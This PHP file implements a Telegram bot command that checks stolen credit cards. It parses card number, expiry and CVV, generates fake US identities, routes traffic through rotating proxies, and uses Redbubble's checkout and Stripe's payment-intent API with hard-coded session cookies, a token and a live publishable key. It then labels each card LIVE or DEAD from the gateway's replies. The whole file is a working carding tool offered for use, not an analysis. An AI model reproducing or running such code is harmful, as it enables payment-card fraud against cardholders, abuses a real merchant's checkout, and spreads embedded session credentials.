<?php
if((strpos($message, '/stp') === 0) or (strpos($message, '.stp') === 0)){
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

if (empty($message)){
    sendMessage($chatId, "<b>
━━━•❅•°•❈ - •°•❅•━━━
● Hey enter a valid CC to check.
● Example: <code>/str 4912685160994312</code>
━━━•❅•°•❈ - •°•❅•━━━
</b>",$message_id);
exit();
}
$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$error = "<b>[⚠️]You're Fine?<i> Give me a valid CC❗</i></b>";
$cc1 = substr($cc, 0, 1);

if((is_numeric($cc)) & (is_numeric($mes)) & (is_numeric($ano))){
$arraycc = ['1', '2', '8', '9'];
if(in_array($cc1, $arraycc)){
        sendMessage($chatId, $error, $message_id);

    exit();
}if(empty($mes) or empty($ano) or empty($cvv)){
  sendMessage($chatId, $error, $message_id); 
  exit();
}
$starttime = microtime(true);
$mytime = 'time1';
if (strpos($message, '/chk@TainuxChk_bot') === 0){
    sendMessage($chatId, "<b>
━━━•❅•°•❈ - •°•❅•━━━
● Hey enter a valid CC to check.
● Example: <code>/ch 4912681604312|02|2024|216</code>
━━━•❅•°•❈ - •°•❅•━━━
</b>",$message_id);
exit();
}
if (empty($cc)) {
sendMessage($chatId, "<b>
🧩Stripe auth[1]
STRING: <code>ccs/month/year/cvv ❗</code>️
</b>",$message_id);
exit();
}
$bin = substr($cc, 0, 6);


//prepaid
 /* $url = 'https://young-badlands-00017.herokuapp.com/?bin='.$cc.'';
$fim = json_decode(file_get_contents($url), true);
  $code = $fim["code"];
    if($level != 'true'){
    sendMessage($chatId,"<b>[⚠️]You're Fine?<i>Enter a valid CC ️</i></b>", $message_id);
    exit();
  }*/

$bin2 = strlen($lista);
if ($bin2 < 6){
sendMessage($chatId, "<b>
━━━•❅•°•❈ - •°•❅•━━━
● Hey enter a valid Bin to check.
● Of more than 5 digits
━━━•❅•°•❈ - •°•❅•━━━
</b>",$message_id);
exit();
}

$sss = sendMessage($chatId,"<b>
Welcome  | TainuxChk 🤖
↳ GateOnly Stripe [💫]⭐🌟✨
━━━━━━━━━━━━━━━━━━━━━
● Card Outcome
 ➥ <code>$lista</code>
● Time Process
➥ {$mytime($starttime)}s □□□□□ 0%[⬛️]♻️🌍🤖
●  Checking
 ➥ <a href='tg://user?id=$userId'>$username</a> $Rank
●  Bot by :- <i>$owner</i>
</b>", $message_id);


//$update = file_get_contents($sss);
$respon = json_decode($sss, true);
$message_id2 = $update["message"]["message_id"]; 
$message_id2 = $message_id2 + 1;
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$namec = "$firstname $lastname";
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
  $namec = "$firstname+$lastname";
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//
//==================[BIN LOOK-UP]======================//
$url = 'https://young-badlands-00017.herokuapp.com/?bin='.$cc.'';
$fim = json_decode(file_get_contents($url), true);
$message = $fim["msg"];
$level = $fim["level"];
$type = $fim["type"];
$brand = $fim["brand"];
$prepaid = $fim["prepaid"];
$country = $fim["country"]["name"];
$currency = $fim["country"]["currency"];
$bank = $fim["bank"]["name"];
$bankurl = $fim["bank"]["site"];
$bankphone = $fim["bank"]["phone"];
$emoji = $fim["country"]["flag"];
$pais = $fim["country"]["ISO2"];
$curl = curl_exec($ch);
/*$brand = strtoupper($brand);
$type = strtoupper($type);
$card = strtoupper($card);
$country = strtoupper($country);*/



  //==================[BIN LOOK-UP-END]======================//
edit_message($chatId,"<b>
Welcome  | TainuxChk 🤖
↳ GateOnly Stripe [💫]⭐🌟✨
━━━━━━━━━━━━━━━━━━━━━
● Card Outcome
 ➥ <code>$lista</code>
● Time Process
➥ {$mytime($starttime)}s ■□□□□ 20%[🟥]♻️🌍🤖
●  Checking
 ➥ <a href='tg://user?id=$userId'>$username</a> $Rank
●  Bot by :- <i>$owner</i>
</b>",$message_id2);

  
  edit_message($chatId,"<b>
Welcome  | TainuxChk 🤖
↳ GateOnly Stripe [💫]⭐🌟✨
━━━━━━━━━━━━━━━━━━━━━
● Card Outcome
 ➥ <code>$lista</code>
● Time Process
➥ {$mytime($starttime)}s ■■□□□ 40%[🟨]♻️🌍🤖
●  Checking
 ➥ <a href='tg://user?id=$userId'>$username</a> $Rank
●  Bot by :- <i>$owner</i>
</b>",$message_id2);

edit_message($chatId,"<b>
Welcome  | TainuxChk 🤖
↳ GateOnly Stripe [💫]⭐🌟✨
━━━━━━━━━━━━━━━━━━━━━
● Card Outcome
 ➥ <code>$lista</code>
● Time Process
 ➥ {$mytime($starttime)}s ■■■□□ 60%[🟧]♻️🌍🤖
●  Checking
 ➥ Proxy :- $statuspro $emojipro
 ➥ <a href='tg://user?id=$userId'>$username</a> $Rank
●  Bot by :- <i>$owner</i>
</b>",$message_id2);

//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.redbubble.com/es/api/checkout/v1/stripe/pay');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.redbubble.com',
'method: POST',
'path: /es/api/checkout/v1/stripe/pay',
'scheme: https',
'accept: */*',
'accept-language: es-ES,es;q=0.9',
'cookie: rbVisitorId=01G2CMT8T00SFJS5N4VY5R4XD7; qt_split=0; ajs_anonymous_id=redbubble:01G2CMT8T0J71RQ02GB7Q1HHT0; CookieConsent={stamp:"-1",necessary:true,preferences:true,statistics:true,marketing:true,ver:1,utc:1651839438487,region:"CO"}; _fbp=fb.1.1651839440566.2131738620; _gcl_au=1.1.141478270.1651839446; splitVar=steelhouse; QSI_S_ZN_br5amnLEmOXdurH=v:0:0; gclid=undefined; _scid=268db6b1-1f87-46ba-97be-ff6200fb5642; _rdt_uuid=1651839454637.67c61ef4-4751-4448-b520-7d169df8f301; __pdst=ea07d8cbffe34a0c8e2fd9c61d87d739; _pin_unauth=dWlkPVlqUXlNR1ZsT0RZdE1XVTBaaTAwTlRNNExUazNZelV0T1dSbE1XWmtZamM1TmpBMA; _sctr=1|1651813200000; time_zone={"offset":300,"dst":0}; __ssid=3d70b17513c49c001dd135bce1338d3; __zlcmid=19qku9j6Ol2mHWi; _rb_session=358b2015a44c8462974ff9c3570751972990458169f57d8a0328b867fd21e119; _gid=GA1.2.792462886.1651979581; IR_gbd=redbubble.com; IR_PI=1651839458924.y85gx8ti2cg|1652066013529; open_id_token=eyJhbGciOiJFUzI1NiIsImtpZCI6InJlZGJ1YmJsZS00IiwidHlwIjoiSldUIn0.eyJhbXIiOlsidW5hdXRoZW50aWNhdGVkIl0sImF1ZCI6InJlZGJ1YmJsZS1zZXJ2aWNlcyIsImV4cCI6MTY1MTk4MDcyOCwiaWF0IjoxNjUxOTgwMTI4LCJpc3MiOiJodHRwczovL3d3dy5yZWRidWJibGUuY29tIiwic3ViIjoicmVkYnViYmxlOjAxRzJDTVQ4VDBKNzFSUTAyR0I3UTFISFQwIn0.5lMZgST_lTsecwLs0cJHMoOj8L88mq-qhCyJ9lVhW50j7YqIY_FdJDkFnm6ujhjSJ34x3JM9whYA5wcusfgL0w; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=c5XLNsU8WiQCyT0uK0NDAwdh8OQBr2B6VRiGiz11P7OrqJQTaYyNtb2rk4mDmLI=; cto_bundle=1XlqB18lMkZmWnVNR28lMkZ6SjJUSTJtMm4lMkJhZ09iV2JoVnJvVDhFQnBoZE1aYmVqdGZXTEFjcGl4S3MxN3NyRTd6SnpsQ01rMkgycTRscWhiakxWVzJ2TGJoYjZMTzgyaGlyNnkxQnRqWlJXNiUyRmF0cjYwNGFrR1VaYXpqRWUxanBMUWJlYnY2TDJlYUo1THhUMEhmdDhzSFpBcDNlZyUzRCUzRA; _rb_session4=Z2RBUTd6djFxMG5idU4xRVJOdzhLVDV0YkFzRXN4Yk4zS0cvTlEyVXlTYTRqUVRNOFpvYWVXNG5TTjVId3U1amtBUkdCekVHc0gvUU10SWxXUEovK2MyWGFhYTRrYzVuOENvem02ZU41SUlPNWpXVXdBNUhDemhZY0tuTTJlN1RMblpQaVhRRFlpT29IKzI0Vm9jdGczajBZNHl1UTlpUENIOGJFZm0xWG8zMktrSE9peG5GVmcyV3Fka0laOEpwLS1qekVNdzh3Y3dBN3hMU3ljTDBzS3VBPT0=--79d71eab6cbe2f990971db262acf4bdc40c2e639; _ga_QB79Q66SYP=GS1.1.1651979598.3.1.1651980399.60; _ga=GA1.1.1310445244.1651839435; IR_11754=1651980415155|0|1651980415155||; _uetsid=d47a65c0ce7c11ecb687af53a39aba00; _uetvid=fe8e4d90cd3611ecb9ac9ff4788245dd; _derived_epik=dj0yJnU9Ny1JTGtWTE4yQkI1ZlN2NUtWekI4TjN0UF82ZmI3V2Umbj1JSGg4WmN1VGdTSEZxalpJNWdtMFFBJm09MSZ0PUFBQUFBR0ozT0k0JnJtPTEmcnQ9QUFBQUFHSjNPSTQ; __stripe_mid=7d077866-267a-496a-88d6-0966825c002d2591be; __stripe_sid=f6d98ef0-8c40-4525-a079-23d020f53f7d63c311; _dd_s=rum=0&expire=1651981534260',
'content-type: application/json',
'origin: https://redbubble.com',
'referer: https://www.redbubble.com/es/cart',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Mobile Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"currency_iso":"USD","payment_method_type":"card","save_credit_card":false,"is_saved_credit_card":false,"order_details":{"email":"'.$email.'","shipping_details":{"phone_number":"'.$phone.'","name":"'.$namec.'","address":{"city":"newyork","country_code":"CO","line1":"street b3","state":"Florida","postal_code":"'.$zip.'"}},"billing_details":{"phone_number":"'.$phone.'","name":"'.$namec.'","address":{"city":"newyork","country_code":"CO","line1":"street b3","state":"Florida","postal_code":"'.$zip.'"}}}}');

 $result1 = curl_exec($ch);
 $id = trim(strip_tags(GetStr($result1,'"id":"','"')));
$client = trim(strip_tags(GetStr($result1,'"client_secret":"','"')));

//=======================[1 REQ-END]==============================//
  
edit_message($chatId,"<b>
Welcome  | TainuxChk 🤖
↳ GateOnly Stripe [💫]⭐🌟✨
━━━━━━━━━━━━━━━━━━━━━
● Card Outcome
 ➥ <code>$lista</code>
● Time Process
 ➥ {$mytime($starttime)}s ■■■■□ 80%[🟧]♻️🌍🤖
●  Checking
 ➥ Proxy :- $statuspro $emojipro
 ➥ <a href='tg://user?id=$userId'>$username</a> $Rank
●  Bot by :- <i>$owner</i></b>",$message_id2);


//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$id.'/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_intents/'.$id.'/confirm',
'scheme: https',
'accept: application/json',
'accept-language: es-ES,es;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Mobile Safari/537.36',
   ));

# ----------------- [customer req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'payment_method_data[type]=card&payment_method_data[billing_details][email]='.$email.'&payment_method_data[billing_details][name]='.$firstname.'+'.$lastname.'&payment_method_data[billing_details][address][line1]='.$street.'&payment_method_data[billing_details][address][city]='.$city.'&payment_method_data[billing_details][address][state]='.$state.'&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]='.$zip.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=afa27a18-844c-4cde-8b4c-28314214bec5a4b450&payment_method_data[muid]=7d077866-267a-496a-88d6-0966825c002d2591be&payment_method_data[sid]=f6d98ef0-8c40-4525-a079-23d020f53f7d63c311&payment_method_data[payment_user_agent]=stripe.js%2Fdb679ddd7%3B+stripe-js-v3%2Fdb679ddd7&payment_method_data[time_on_page]=268556&expected_payment_method_type=card&key=pk_live_uzK8Qb4zoY23JzF8EXzriXTH&client_secret='.$client.'');

$result = curl_exec($ch);
$message = trim(strip_tags(GetStr($result,'"message": "','"')));
$code = trim(strip_tags(GetStr($result,'"decline_code": "','"')));
$payment = trim(strip_tags(GetStr($result,'"last_payment_error": ',',')));

//"last_payment_error": null,

  //$idcustomer = trim(strip_tags(GetStr($resultcustomer,'"id":"','"')));

//=======================[CUSTOM REQ END]==================================//

//=======================[MADE BY]==============================//

$made = "<code>Anton1o_x</code>";

//=======================[MADE BY]==============================//
 edit_message($chatId,"<b>
Welcome  | TainuxChk 🤖
↳ GateOnly Stripe [💫]⭐🌟✨
━━━━━━━━━━━━━━━━━━━━━
● Card Outcome
 ➥ <code>$lista</code>
● Time Process
 ➥ {$mytime($starttime)}s ■■■■■ 100%[🟩]♻️🌍🤖
●  Checking
 ➥ Proxy :- $statuspro $emojipro
 ➥ <a href='tg://user?id=$userId'>$username</a> $Rank
●  Bot by :- <i>$owner</i></b>",$message_id2);
//=======================[Responses]==============================//
# - [CVV Responses ] - #

if ((strpos($result, '"cvc_check":"pass"')) || (strpos($result, "Thank You.")) || (strpos($result, 'Your card zip code is incorrect.')) || (strpos($result, "Thank You For Donation.")) || (strpos($result, "incorrect_zip")) || (strpos($result, "Success ")) || (strpos($result, '"type":"one-time"')) || (strpos($result, "/donations/thank_you?donation_number="))){
$status08 = 'LIVE CVV';
$response08 = 'Thank You For Donation.';
$emojit = $emojil;
}
elseif (strpos($result, 'result":"success","redirect":')){
$status08 = 'LIVE CVV';
$response08 = 'Thank You For Donation.';
$emojit = $emojil;
}

elseif ((strpos($result, "Your card has insufficient funds.")) || (strpos($result, '"cvc_check": "fail"'))){
$status08 = 'LIVE CVV';
$response08 = 'Your card has insufficient funds.';
$emojit = $emojil;
}
# - [CVV Responses ] - #


# - [CCN Responses ] - #

elseif ((strpos($result, 'security code is incorrect.')) || (strpos($result, "security code is invalid.")) || (strpos($result, "Your card's security code is incorrect.")) || (strpos($result, "incorrect_cvc"))){
$status08 = 'LIVE CCN';
//$message = "Card Authorized.";
$emojit = $emojil;
    
}

#-[CCN Responses END ]- #



#- [Stolen,Lost,Pickup Responses]- #

elseif ((strpos($result, 'stolen_card')) || (strpos($result, "lost_card")) || (strpos($result, "pickup_card."))){
    $status08 = 'DEAD';
$response08 = 'Pickup or lost card';
$emojit = $emojid; 
    
}

# -[Reprovada,Decline Responses ] - #

elseif ((strpos($result, 'card was declined')) || (strpos($result1, "generic_decline")) || (strpos($result, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result, "processing_error")) || (strpos($result, "parameter_invalid_empty")) || (strpos($result, 'lock_timeout')) || (strpos($result, "transaction_not_allowed"))){
$status08 = 'DEAD';
$response08 = 'do_not_honor';
$emojit = $emojid; 
    
}
elseif (strpos($result1, 'Your card number is incorrect.')){
$status08 = 'DEAD';
//$message = 'The card number is incorrect.';
$emojit = $emojid; 
    
}
elseif (strpos($message, "Your card has expired.")){
$status08 = 'DEAD';
//$message = 'The card expiration month is invalid';
$emojit = $emojid; 
    
}
elseif (strpos($code, "invalid_account")){
$status08 = 'DEAD';
$message = 'Invalid account.';
$emojit = $emojid; 
    
}
  elseif (strpos($result1, "Your card's expiration month is invalid")){
$status08 = 'DEAD';
//$message = 'The card expiration month is invalid';
$emojit = $emojid; 
    
}
elseif (strpos($result1,  "Your card's expiration year is invalid.")) {
$status08 = 'DEAD';
//$message = 'Your card has expired.';
$emojit = $emojid; 
    
}

elseif (strpos($result, "You have exceeded the maximum number of declines on this card in the last 24 hour period. Please contact us via https://support.stripe.com/contact if you need further assistance.")) {
$status08 = 'DEAD';
$message = 'card_decline_rate_limit_exceeded';
$emojit = $emojid; 
    
}
//

elseif (strpos($result, "Your card does not support this type of purchase.")){
$status08 = 'DEAD';
$response08 = 'Generic decline.';
$emojit = $emojid; 
    
}
elseif (strpos($result, "Your card number is incorrect.")){
$status08 = 'DEAD';
//$message = 'Incorrect card number';
$emojit = $emojid; 
    
}

elseif ((strpos($result, '{')) || (strpos($result, "missing_payment_information")) || (strpos($result, 'three_d_secure_redirect')) || (strpos($result, '"cvc_check": "unchecked"')) || (strpos($result, "service_not_allowed")) || (strpos($result, '"cvc_check": "unchecked"')) || (strpos($result, 'Your card does not support this type of purchase.')) || (strpos($result, "transaction_not_allowed"))){
$status08 = 'DEAD';
$message = 'Unknow reason';
$emojit = $emojid; 
    
}
elseif ((strpos($result, 'card was declined')) || (strpos($result1, "generic_decline")) || (strpos($result, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result, "processing_error")) || (strpos($result, "parameter_invalid_empty")) || (strpos($result, 'lock_timeout')) || (strpos($result, "transaction_not_allowed"))){
    $status08 = 'DEAD';
$response08 = 'Your card was declined.';
$emojit = $emojid; 
    
}

elseif($payment == 'null'){
    $status08 = 'DEAD';
    $message = '3D lookup Enrolled';
}

# - [Reprovada,Decline Responses END ] - #



# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] - #


elseif(strpos($result1,  '-1')){
$status08 = 'DEAD';
//$message = 'Gateway or IP dead';
$emojit = $emojid; 
}
/*
else{
$status08 = 'DEAD';
$response08 = 'Unknown Error';
$emojit = $emojid;
    
}
else{
$status08 = 'DEAD';
$message = 'Gateway or IP dead2';
$emojit = $emojid; 
}*/
if($statuspro == 'DEAD'){
$status08 = 'DEAD';
$response08 = 'IP dead';
$emojit = $emojid; 
}
if($status08 == 'DEAD'){
$status08230 = "Declined [$emojid]";
}else{
$status08230 = "Approved! [$emojil]";
}

  $extra = str_pad(substr($cc, 0,12), 16, "x");

edit_message($chatId,
"<b>
>_. Stripe Gateway ❤️‍🔥
━━━━━━━━━━━━━━━
$ Input ➜ <code>$lista</code>
$ Status ➜ <code>$status08230</code>
$ Reponse ➜ <code>$message</code>

∆ Bin ➜ <code>$bin [$emoji]</code>
∆ Country ➜ <code>$country($pais) ~ $currency</code>
∆ Info ➜ <code>$brand ~ $type ~ $level</code>
∆ Bank ➜ <code>$bank</code>
━━━━━━━━━━━━━━━
Time ➜ <code>{$mytime($starttime)}s</code>
User ➜ <a href='tg://user?id=$userId'>$username</a> $Rank
By ➜ <code>$owner</code>
</b>",$message_id2);  

curl_close($ch);
ob_flush();
}else{
    sendMessage($chatId, $error, $message_id);
}
}



//• Proxy -» $statuspro $emojipro

////////CHK END COMMAND///////////


?>